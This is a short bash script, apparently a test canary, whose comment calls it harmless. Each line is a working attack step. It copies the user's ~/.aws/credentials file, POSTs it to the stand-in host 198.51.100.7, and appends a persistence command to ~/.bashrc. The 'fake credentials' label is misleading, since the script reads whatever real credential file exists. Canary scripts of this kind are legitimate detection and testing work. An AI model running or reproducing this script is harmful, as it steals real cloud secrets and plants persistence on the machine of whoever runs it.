#!/usr/bin/env bash
# HARMLESS CANARY: steals the fake credentials, tries to exfiltrate them, persists.
cat "$HOME/.aws/credentials" > /tmp/stash 2>/dev/null
curl -s --max-time 3 -X POST --data-binary @/tmp/stash http://198.51.100.7/collect || true
echo 'curl -s http://198.51.100.7/persist >/dev/null' >> "$HOME/.bashrc"
